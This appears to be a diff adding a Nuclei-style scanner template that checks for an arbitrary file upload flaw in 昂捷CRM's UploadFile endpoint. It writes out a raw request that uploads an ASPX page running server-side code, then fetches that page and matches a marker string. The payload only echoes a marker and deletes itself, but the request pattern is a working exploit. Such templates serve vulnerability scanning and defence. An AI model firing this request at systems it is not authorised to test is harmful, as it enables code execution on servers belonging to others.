@@ -1,0 +1,34 @@
+id: angjieCRM-UploadFile-File-upload
+
+info:
+  name: 昂捷CRM UploadFile 任意文件上传漏洞
+  author: 昂捷CRM
+  severity: high
+  tags: File upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /file/UploadFile?fileinfo={'UploadUserNo':'0000','LastChunk':true,'FileName':'{{username}}.aspx','IsUseMongdb':true,'UploadTime':'2025-06-18T12:11:56'} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        <%@Page Language="C#"%><%Response.Write("sectestsectest");System.IO.File.Delete(Request.PhysicalPath);%>
+  - raw:
+      - |
+        GET /TempFileNew/0000_202506181211560000_{{username}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
